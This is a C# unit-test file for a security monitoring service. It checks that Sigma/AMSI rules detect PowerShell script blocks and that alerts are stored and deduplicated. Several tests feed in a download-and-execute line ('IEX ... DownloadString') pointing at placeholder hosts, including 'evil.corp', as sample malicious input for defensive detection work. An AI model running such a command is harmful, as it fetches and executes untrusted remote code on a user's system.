using Downpour.Contracts;
using Downpour.Service;
using Microsoft.Extensions.Logging.Abstractions;

namespace Downpour.Tests;

public sealed class SigmaAlertPersistenceTests : IAsyncLifetime
{
    private readonly string _directory = Path.Combine(Path.GetTempPath(), $"downpour-sigma-{Guid.NewGuid():N}");
    private SecurityAlertRepository _repository = null!;

    public async Task InitializeAsync()
    {
        Directory.CreateDirectory(_directory);
        _repository = new SecurityAlertRepository(Path.Combine(_directory, "alerts.db"));
        await _repository.InitializeAsync();
    }

    public Task DisposeAsync()
    {
        Microsoft.Data.Sqlite.SqliteConnection.ClearAllPools();
        try { Directory.Delete(_directory, recursive: true); } catch (IOException) { }
        return Task.CompletedTask;
    }

    private static SecurityEventObservation ScriptBlock(string text, long record) =>
        new("Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-PowerShell", 4104, record, DateTimeOffset.UtcNow, "LOW", "T1059.001", text, 1);

    [Fact]
    public async Task SigmaDetectionsAreStoredAsValidFindingAlerts()
    {
        var processor = new SigmaAmsiEventProcessor(NullLogger<SigmaAmsiEventProcessor>.Instance);
        var detections = processor.ProcessEvent(ScriptBlock("IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')", 42));
        Assert.NotEmpty(detections);

        var findings = detections.Select(SigmaAmsiPushWorker.ToFinding).ToArray();
        Assert.All(findings, finding => Assert.True(finding.Source is SecurityFindingCatalog.Sigma or SecurityFindingCatalog.Amsi));
        await _repository.IngestFindingsAsync(findings, DateTimeOffset.UtcNow);

        var snapshot = await _repository.ReadSnapshotAsync();
        Assert.Equal(findings.Length, snapshot.TotalCount);
        Assert.True(Downpour.Core.SecurityAlertClient.IsValidSnapshot(snapshot));
        Assert.All(snapshot.Alerts, alert => Assert.DoesNotContain("DownloadString", alert.Title));
    }

    [Fact]
    public void MetadataOnlyObservationsCannotMatchSigmaRules()
    {
        // The event provider is metadata-only: a 4104 observation's Summary is the catalog text, not the script.
        // Until script-block content is collected (a consent decision, DN-029), Sigma cannot fire on live events.
        SecurityEventCatalog.TryGetRule("Microsoft-Windows-PowerShell/Operational", 4104, out var rule);
        var processor = new SigmaAmsiEventProcessor(NullLogger<SigmaAmsiEventProcessor>.Instance);
        Assert.DoesNotContain(processor.ProcessEvent(ScriptBlock(rule.Summary, 7)), alert => alert.Title.StartsWith("Sigma", StringComparison.Ordinal));
    }

    [Fact]
    public void ScriptBlockIsAnalyzedInMemoryBySigmaAmsiEventProcessor()
    {
        var processor = new SigmaAmsiEventProcessor(NullLogger<SigmaAmsiEventProcessor>.Instance);
        var block = new ScriptBlock(100, DateTimeOffset.UtcNow, "IEX (New-Object Net.WebClient).DownloadString('http://evil.corp/payload.ps1')", 1, 1);
        var detections = processor.ProcessScriptBlock(block);

        Assert.NotEmpty(detections);
        Assert.Contains(detections, d => d.Title.Contains("Sigma", StringComparison.OrdinalIgnoreCase));
    }
}

public sealed class SigmaRuleDeduplicationTests
{
    [Fact]
    public void OneScriptBlockRaisesEachRuleTitleOnce()
    {
        var processor = new SigmaAmsiEventProcessor(Microsoft.Extensions.Logging.Abstractions.NullLogger<SigmaAmsiEventProcessor>.Instance);
        var detections = processor.ProcessScriptBlock(new ScriptBlock(1, DateTimeOffset.UtcNow,
            "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')", 1, 1));
        Assert.NotEmpty(detections);
        Assert.Equal(detections.Count, detections.Select(d => d.Title).Distinct().Count());
    }
}
